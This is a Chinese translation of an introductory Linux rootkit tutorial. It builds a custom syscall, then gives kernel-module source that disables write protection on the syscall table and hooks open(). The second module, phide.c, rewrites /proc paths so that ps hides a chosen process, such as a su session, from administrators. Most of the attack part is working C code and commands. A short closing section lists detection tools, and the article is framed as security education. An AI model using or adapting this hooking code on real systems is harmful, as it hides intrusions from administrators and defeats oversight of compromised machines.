> 原文链接: https://www.anquanke.com//post/id/85202 


# 【技术分享】Rootkit技术入门：从syscall到hook！


                                阅读量   
                                **214205**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01d205c9732c66d062.png)](https://p1.ssl.qhimg.com/t01d205c9732c66d062.png)

****

**翻译：**[**shan66******](http://bobao.360.cn/member/contribute?uid=2522399780)

**预估稿费：200RMB（不服你也来投稿啊！）**

**<strong><strong>投稿方式：发送邮件至**[**linwei#360.cn**](mailto:linwei@360.cn)**，或登陆**[**网页版**](http://bobao.360.cn/contribute/index)**在线投稿**</strong></strong>



**警告：本教程仅用于安全研究，切勿因其他目的而制作rootkit。**

<br>

**什么是rootkit **

简单地说，rootkit是一种能够隐身的恶意程序，也就是说，当它进行恶意活动的时候，操作系统根本感觉不到它的存在。想象一下，一个程序能够潜入到当前操作系统中，并且能够主动在进程列表中隐藏病毒，或者替换日志文件输出，或者两者兼而有之——那它就能有效地清除自身存在的证据了。此外，它还可以从受保护的内存区域中操纵系统调用，或将接口上的数据包导出到另一个接口。本教程将重点介绍如何通过hooking系统调用来进行这些活动。在本教程的第一部分，我们将打造自己的系统调用，然后打造一个hook到我们创建的系统调用上面的rootkit。在最后一部分，我们将创建一个rootkit来隐藏我们选择的进程。

<br>

**用户空间与内核空间 **

我们之所以上来就打造一个系统调用，其目的就是为了更好地理解在内核空间与用户空间中到底发生了些什么。在用户空间中运行的进程，对内存的访问将受到一定限制，而在内核空间运行的进程则可以访问所有内存空间。但是，用户空间的代码可以通过内核暴露的接口来访问内核空间，这里的所说的接口就是系统调用。如果你曾经用C语言编程，并且摆弄过Linux的话（是的，我们将用C编程，但不用担心，因为这里介绍的例子会非常简单），那么你很可能已经用过系统调用了，只不过你没有意识到罢了。read()、write()、open()就是几个比较常见的系统调用，只不过我们通常都是通过诸如fopen()或fprintf()之类的库函数来调用它们而已。

当你以root身份运行进程的时候，不见得它们就会运行在内核空间。因为root用户进程仍然是一个用户空间的进程，只不过root用户的进程的UID = 0，内核验证过其身份后会赋予其超级用户权限罢了。但是，即使拥有超级用户权限，仍然需要通过系统调用接口才能请求内核的各种资源。我希望大家能够明确这一点，这对进一步阅读下面的内容非常重要。

好了，闲话少说，下面切入正题。

<br>

**所需软硬件 **



linux内核（我使用debian的最小化安装，内核版本为3.16.36）

虚拟机软件（VMware、Virtualbox、ESXi等）

我建议给VM配置2个CPU内核，至少4GB内存，但1核和2GB也能对付。

需要强调的是︰ 

1.	我不会对示例代码进行详尽的介绍，因为代码都自带了注释。这样做好处是，可以督促读者自行深入学习。

2.	我的VM使用的是Debian最小化安装，因为我发现内核的版本越旧，打造自己的系统调用时就越容易，这就是选择3.16.36的原因。

3.	文中的所有命令都是以root帐户在VM中运行的。

<br>

**创建系统调用：pname**

**** 启动VM，让我们先从一个内核源码开始玩起。实际上，介绍如何打造自己的系统调用的教程已经有许多了。如果你想打造一个简单的“hello world”系统调用的话，请参考这篇文章：[https://chirath02.wordpress.com/2016/08/24/hello-world-system-call/](https://chirath02.wordpress.com/2016/08/24/hello-world-system-call/)。

通过下面的命令，获取内核源码的副本，并将其解压缩到/usr/src目录下面： 



```
wget https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.16.36.tar.xz
tar -xvf linux-3.16.36.tar.xz -C /usr/src/
cd /usr/src/linux-3.16.36
```

**pname (进程名称):**

现在，让我们从一个简单的系统调用开始入手：当向它传递一个进程名称时，它会将该进程对应的PID返回到启动该系统调用的终端上面。首先，创建目录pname，然后通过cd命令切换到该目录下面：



```
mkdir pname
cd pname
nano pname.c
```



```
#include &lt;linux/syscalls.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/sched.&gt;
#include &lt;linux/init.h&gt;
#include &lt;linux/tty.h&gt;
#include &lt;linux/string.h&gt;
#include "pname.h"
asmlinkage long sys_process_name(char* process_name)`{`
    /*tasklist struct to use*/
    struct task_struct *task;
    /*tty struct*/
    struct tty_struct *my_tty;
    /*get current tty*/
    my_tty = get_current_tty();
    /*placeholder to print full string to tty*/
    char name[32];
    /*&lt;sched.h&gt; library method that iterates through list of processes from task_struct defined above*/
    for_each_process(task)`{`
        /*compares the current process name (defined in task-&gt;comm) to the passed in name*/
        if(strcmp(task-&gt;comm,process_name) == 0)`{`
            /*convert to string and put into name[]*/
            sprintf(name, "PID = %ldn", (long)task_pid_nr(task));
            /*show result to user that called the syscall*/
                        (my_tty-&gt;driver-&gt;ops-&gt;write) (my_tty, name, strlen(name)+1);
        `}`
    `}`
    return 0;
`}`
```

然后，创建头文件：

```
nano pname.h
```

```
asmlinkage long sys_process_name(char* process_name);
```

接下来，创建一个Makefile： 

```
nano Makefile
```

在里面，添加如下内容： 

```
obj-y := pname.o
```

保存并退出。

**将pname目录添加到内核的Makefile中：**

回到/usr/src/linux-3.16.36目录，并编辑Makefile



```
cd ..
nano Makefile
```

您要查找core-y += kernel/mm/fs/ipc/security/crypto/block/所在的行。

```
cat -n Makefile | grep -i core-y
```

然后 

```
nano +(line number from the cat command here) Makefile
```

[![](https://p2.ssl.qhimg.com/t01356ee278bf62998b.jpg)](https://p2.ssl.qhimg.com/t01356ee278bf62998b.jpg)

将pname目录添加到此行的末尾（不要忘记“/”）： 

```
core-y += kernel/ mm/ fs/ ipc/ security/ crypto/ block/ pname/
```

当我们编译这个文件的时候，编译器就会知道从哪里寻找创建新的系统调用所需的源文件了。

**将pname和sys_process_name添加到系统调用表中：**

请确保仍然位于/usr/src/linux-3.16.36目录中。接下来，我们需要将新建的系统调用添加到系统调用表中。如果您使用的是64位系统，那么它将会添加到syscall_64.tbl文件的前＃300之后（将64位和32位系统调用隔离开来）。此前，我的64位系统调用最后一个是＃319，所以我的新系统调用将是＃320。如果它是一个32位系统，那么你可以在syscall_32.tbl文件结尾处进行相应的编辑。

```
nano arch/x86/syscalls/syscall_64.tbl
```

添加新的系统调用： 

```
320 common pname sys_process_name
```

[![](https://p1.ssl.qhimg.com/t01e95753d5ee38c7e5.jpg)](https://p1.ssl.qhimg.com/t01e95753d5ee38c7e5.jpg)

将sys_process_name(char * process_name)添加到syscall头文件中：

最后，头文件必须提供我们函数的原型，因为asmlinkage用于定义函数的哪些参数可以放在堆栈上。它必须添加到include / linux / syscalls.h文件的最底部： 

```
asmlinkage long sys_process_name(char* process_name);
```

[![](https://p4.ssl.qhimg.com/t01044ba41d0ffa0fca.jpg)](https://p4.ssl.qhimg.com/t01044ba41d0ffa0fca.jpg)

**编译新内核（这个过程需要一段时间，请稍安勿躁）： **

这将需要很长时间，大概需要1-2小时或更多，具体取决于这个VM所拥有的资源的多寡。然后，从源代码文件夹/usr/src/linux-3.16.36中输入下列命令： 

```
make menuconfig
```

通过方向键选中保存选项，按回车键，然后退出。

如果您正在运行的虚拟机具有2个内核，则可以使用下列命令： 

```
make -j 2
```

否则的话，只需输入下列命令即可： 

```
make
```

现在，耐心等待它运行结束。

**安装新编译的内核：**

完成上述操作后（希望没有任何错误），还必须进行安装操作，然后重新启动。



```
make install -j 2 # or without -j option if not enough cores
make modules_install install
reboot
```

**测试新的pname系统调用：**

还记得使用哪个数字把我们的系统调用中添加到系统调用表中的吗？我使用的数字为320，这意味着系统调用号为320，同时，我们必须以字符串的形式来传递进程名称。下面，让我们测试一下这个新的系统调用。

```
nano testPname.c
```



```
#include &lt;stdio.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
int main()`{`
    char name[32];
    puts("Enter process to find");
    scanf("%s",name);
    strtok(name, "n");
    long int status = syscall(320, name); //syscall number 320 and passing in the string. 
    printf("System call returned %ldn", status);
    return 0;
`}`
```



```
gcc testPname.c -o testPname
./testPname
```

由于我使用ssh配置我的VM，我将进入进程sshd。我打开了另一个终端来查看所有通过sshd运行的进程，然后运行该可执行文件： 

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0122f8d050b52e773c.jpg)

该系统调用通过遍历进程列表发现了3个sshd进程（grep sshd不是正在运行的sshd进程），并通过TTY将其输出到调用它的终端上，最后成功退出（状态值为0）。

现在，您已经有权在内核（受保护的内存区）空间中查找进程了。这个进程列表中，你不会发现这个系统调用——尽管它正在运行，但你会发现testPname可执行文件正在运行： 

[![](https://p4.ssl.qhimg.com/t0125589a978390b510.jpg)](https://p4.ssl.qhimg.com/t0125589a978390b510.jpg)

如何才能找到我们的新系统调用呢？ 很简单：使用strace工具。

```
sudo apt-get install strace
```

针对可执行文件运行strace时，它将暂停以读取用户输入（可以通过系统调用read()来读入，但是需要注意的是，在我们的测试程序中使用的是来自stdio.h库的scanf()函数）。这时，输入你喜欢的任何进程即可。

在下面，从read()系统调用到程序退出的代码都进行了突出显示： 

```
strace ./testPname
```

[![](https://p2.ssl.qhimg.com/t012d4fe0df74ee27ff.jpg)](https://p2.ssl.qhimg.com/t012d4fe0df74ee27ff.jpg)

只要把bash的进程名称传递给strace，它就会立刻找出该进程所使用的系统调用——我们的syscall_320。你也可以使用该工具来检查我们运行的程序用到的所有其他系统调用，例如mmap（内存映射）和mprotect（内存保护）等。我建议大家逐一研究这些系统调用，以充分了解它们都可以做哪些事情，并仔细考虑攻击者能够用它们来干什么。

此后，我们将hooking系统调用open()，但是就目前来说，不妨先用我们的第一个rootkit来“钩取”系统调用syscall_320

<br>

**利用Rootkit“钩取”Pname **

首先要弄清楚的一件事情是，现在我们要以hook的形式来打造一个内核模块，而不是借助系统调用。这些模块可以随时通过insmod和rmmod命令（前提是您已经获得了相应的权限）加载到内存和从内核中删除。为了查看当前正在运行的所有模块，您可以使用lsmod命令。就像我们的新程序将成为一个模块一样，从技术上讲，它可以被定义为一个hook，因为我们将“hooking”到之前创建的pname系统调用上。

在研究过程中，我在[https://www.quora.com/How-can-I-hook-system-calls-in-Linux](https://www.quora.com/How-can-I-hook-system-calls-in-Linux)发现了一篇非常棒的文章，它深入浅出地介绍了打造hook的方法。请选择一个存储hook的目录并利用cd命令切换到这个目录下面，这里我选择的是root目录。

**查找sys_call_table地址：**

我们首先要做的事情就是找到系统调用表地址，因为一旦找到了这个地址，我们就能够对其进行相应的处理，进而hook系统调用了。为了找到这个地址，我们只需在终端中键入： 

```
cat /boot/System.map-3.16.36 | grep sys_call_table
```

[![](https://p2.ssl.qhimg.com/t01e7718c172484de9f.jpg)](https://p2.ssl.qhimg.com/t01e7718c172484de9f.jpg)

将这个地址复制到我们的代码中。

注意：有许多方法可以用来动态搜索sys_call_table，我强烈建议您使用这些方法而不是硬编码。然而，为了便于学习，这里就不那么讲究了。我打算将来编写一个更高级的rootkit，让它也支持动态搜索能力。如果你想提前了解这方面的知识并亲自尝试一下的话，我建议阅读下面的文章： [https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/](https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/)

Hook! Hook! Hook!

以下是我的captainhook.c代码: 



```
#include &lt;asm/unistd.h&gt;
#include &lt;asm/cacheflush.h&gt;
#include &lt;linux/init.h&gt;
#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/syscalls.h&gt;
#include &lt;asm/pgtable_types.h&gt;
#include &lt;linux/highmem.h&gt;
#include &lt;linux/fs.h&gt;
#include &lt;linux/sched.h&gt;
#include &lt;linux/moduleparam.h&gt;
#include &lt;linux/unistd.h&gt;
#include &lt;asm/cacheflush.h&gt;
MODULE_LICENSE("GPL");
MODULE_AUTHOR("D0hnuts");
/*MY sys_call_table address*/
//ffffffff81601680
void **system_call_table_addr;
/*my custom syscall that takes process name*/
asmlinkage int (*custom_syscall) (char* name);
/*hook*/
asmlinkage int captain_hook(char* play_here) `{`
    /*do whatever here (print "HAHAHA", reverse their string, etc)
        But for now we will just print to the dmesg log*/
    printk(KERN_INFO "Pname Syscall:HOOK! HOOK! HOOK! HOOK!...ROOOFFIIOO!");
    return custom_syscall(play_here);
`}`
/*Make page writeable*/
int make_rw(unsigned long address)`{`
    unsigned int level;
    pte_t *pte = lookup_address(address, &amp;level);
    if(pte-&gt;pte &amp;~_PAGE_RW)`{`
        pte-&gt;pte |=_PAGE_RW;
    `}`
    return 0;
`}`
/* Make the page write protected */
int make_ro(unsigned long address)`{`
    unsigned int level;
    pte_t *pte = lookup_address(address, &amp;level);
    pte-&gt;pte = pte-&gt;pte &amp;~_PAGE_RW;
    return 0;
`}`
static int __init entry_point(void)`{`
    printk(KERN_INFO "Captain Hook loaded successfully..n");
    /*MY sys_call_table address*/
    system_call_table_addr = (void*)0xffffffff81601680;
    /* Replace custom syscall with the correct system call name (write,open,etc) to hook*/
    custom_syscall = system_call_table_addr[__NR_pname];
    /*Disable page protection*/
    make_rw((unsigned long)system_call_table_addr);
    /*Change syscall to our syscall function*/
    system_call_table_addr[__NR_pname] = captain_hook;
    return 0;
`}`
static int __exit exit_point(void)`{`
        printk(KERN_INFO "Unloaded Captain Hook successfullyn");
    /*Restore original system call */
    system_call_table_addr[__NR_pname] = custom_syscall;
    /*Renable page protection*/
    make_ro((unsigned long)system_call_table_addr);
    return 0;
`}`
module_init(entry_point);
module_exit(exit_point);
```

你可能已经注意到__NR_pname，它代表数字，即pname的系统调用的编码。别忘了我们已经将该系统调用添加到syscall_64.tbl（tbl = table duhh）中。 我们赋予它一个数字、一个名称和函数名。在这里，我们使用的是其名称（pname）。它将拦截pname系统调用，并且每成功一次就打印一次dmesg。

**创建Makefile：**

我们必须创建另一个Makefile，具体方法就像我们在创建系统调用时所做的一样，但由于这里是一个模块，所以会有一点不同： 

```
nano Makefile
```



```
obj-m += captainHook.o
all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

[![](https://p4.ssl.qhimg.com/t019a56ff17939cd30b.jpg)](https://p4.ssl.qhimg.com/t019a56ff17939cd30b.jpg)

**在加载到运行中的内核后测试该hook： **

现在万事俱备，只剩下编译了。对其进行编译的时候，绝对不会像编译内核那样费时，因为它只是一个模块而已。为此，只需键入下列命令： 

```
make
```

很好，你现在应该多了一些其他文件，而我们想要的是.ko文件： 

[![](https://p3.ssl.qhimg.com/t01187aaeed5b467a53.jpg)](https://p3.ssl.qhimg.com/t01187aaeed5b467a53.jpg)

现在打开另一个终端，键入以下命令以清除dmesg，然后插入该模块并运行testPname，并跟踪其输出：

第一个终端:



```
dmesg -c
dmesg -wH
```

第二个终端:



```
insmod captainHook.ko
cd ..
./testPname
rmmod captainHook
captainhookworks
```

经过一番努力，终于成功地创建了一个可以抓取系统调用（也就是rootkit）的钩子！想象一下，如果你的__NR_ pname是__NR_open或__NR_read会怎样？ 您可以自己尝试一下，或继续阅读下一部分。不过，就这一点来说，有很多其他教程可资利用，例如：[https://ruinedsec.wordpress.com/2013/04/04/modifying-system-calls-dispatching-linux/](https://ruinedsec.wordpress.com/2013/04/04/modifying-system-calls-dispatching-linux/)

<br>

**对系统管理命令“ps”隐身 **

现在，让我们通过编程技术来实现对ps命令隐藏进程。首先，找到你想要隐藏的进程的PID，并想清楚你想让它伪装成哪个进程。就本例而言，我将用一个bash进程给su（sudo）进程打掩护，以便系统管理员看不到有人正在使用超级用户权限运行。

注意：Linux中的一切皆文件。例如“/proc/cpuinfo”文件存放的是CPU信息，内核版本位于“/proc/version”文件中。而“/proc/uptime”和“/proc/stat”文件则分别用来存放系统正常运行时间和空闲时间。当运行ps命令时，它实际上是打开进程的文件，以使用open()系统调用查看相关信息。当进程首次启动时，会使用系统调用write()将其写入具有相应PID＃的文件中。针对ps命令运行strace就能查找它们，或者查看它使用了哪些系统调用。

这里，我们将使用captainHook.c作为样板： 

```
nano phide.c
```



```
#include &lt;asm/unistd.h&gt;
#include &lt;asm/cacheflush.h&gt;
#include &lt;linux/init.h&gt;
#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/syscalls.h&gt;
#include &lt;asm/pgtable_types.h&gt;
#include &lt;linux/highmem.h&gt;
#include &lt;linux/fs.h&gt;
#include &lt;linux/sched.h&gt;
#include &lt;linux/moduleparam.h&gt;
#include &lt;linux/unistd.h&gt;
#include &lt;asm/cacheflush.h&gt;
MODULE_LICENSE("GPL");
MODULE_LICENSE("D0hnuts");
/*MY sys_call_table address*/
//ffffffff81601680
void **system_call_table_addr;
asmlinkage int (*original_open)(const char *pathname, int flags);
asmlinkage int open_hijack(const char *pathname, int flags) `{`
    /*This hooks all  OPEN sys calls and check to see what the path of the file being opened is
    currently, the paths must be hard coded for the process you wish to hide, and the process you would like it to impersonate*/
    if(strstr(pathname, "/proc/2793/status") != NULL) `{`
        printk(KERN_ALERT "PS PROCESS HIJACKED %sn", pathname);
    //The new process location will be written into the syscall table for the open command, causing it to open a different file than the one originaly requested
        memcpy(pathname, "/proc/2794/status", strlen(pathname)+1);
    `}`
    return (*original_open)(pathname, flags);
`}`
//Make syscall table  writeable
int make_rw(unsigned long address)`{`
        unsigned int level;
        pte_t *pte = lookup_address(address, &amp;level);
        if(pte-&gt;pte &amp;~_PAGE_RW)`{`
                pte-&gt;pte |=_PAGE_RW;
        `}`
        return 0;
`}`
// Make the syscall table  write protected
int make_ro(unsigned long address)`{`
        unsigned int level;
        pte_t *pte = lookup_address(address, &amp;level);
        pte-&gt;pte = pte-&gt;pte &amp;~_PAGE_RW;
        return 0;
`}`
static int __init start(void)`{`
        system_call_table_addr = (void*)0xffffffff81601680;
    //return the system call to its original state
        original_open = system_call_table_addr[__NR_open];
        //Disable page protection
        make_rw((unsigned long)system_call_table_addr);
        system_call_table_addr[__NR_open] = open_hijack;
        printk(KERN_INFO "Open psHook loaded successfully..n");
    return 0;
`}`
static int __exit end(void)`{`
        //restore original system call
        system_call_table_addr[__NR_open] = original_open;
        //Enable syscall table  protection
        make_ro((unsigned long)system_call_table_addr);
    printk(KERN_INFO "Unloaded Open psHook successfullyn");
        return 0;
`}`
module_init(start);
module_exit(end);
```

复制前面使用的Makefile，同时将顶部的"captainHook.o"替换为“phide.o”。

然后，输入下列命令 

```
make
```

以及 

```
insmod phide.ko (一定别忘了使用dmesg命令） :
```

[![](https://p2.ssl.qhimg.com/t0112247c8330073586.jpg)](https://p2.ssl.qhimg.com/t0112247c8330073586.jpg)

如您所见，这里成功实现了隐身！除此之外，还可以使用这里介绍的方法来隐藏多个进程。

<br>

**如何防御？ **



你可能注意到了，我这里只是使用另一个正在运行的进程来隐藏我们的进程。所以在PS表中会有重复的PID。这很容易被发现，但有一些方法可以完全隐藏它，我计划在未来的rootkit文章中加以介绍。

记得早些时候我提到的lsmod命令吗？ 它就可以列出在内核上运行的模块，效果具体如下图所示。

[![](https://p4.ssl.qhimg.com/t0129a40ae2c8603f97.jpg)](https://p4.ssl.qhimg.com/t0129a40ae2c8603f97.jpg)

要想查看所有模块，可以使用：

```
cat/proc/modules
```

因为rootkits通常在内存中待命，所以最好使用一个可以主动寻找rootkit的程序，例如：



```
kbeast – https://volatility-labs.blogspot.ca/2012/09/movp-15-kbeast-rootkit-detecting-hidden.html
chkroot – http://www.chkrootkit.org/
kernel check – http://la-samhna.de/library/kern_check.c
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d1e1edb39d2e14b8.jpg)

<br>

**结束语**

我们希望本文能够帮您了解系统调用、内核空间和用户空间方面的相关知识。最重要的是，通过阅读本文，可以让您意识到钩住系统调用其实非常简单的事情，同时，也让您意识到只需少的可怜的编程技巧就足以让你为所欲为。当然，还有一些非常先进的rootkits类型，我们将后续的文章中陆续加以介绍。在下一篇文章中，我们介绍如何在无需查找PID的情况下隐藏进程。
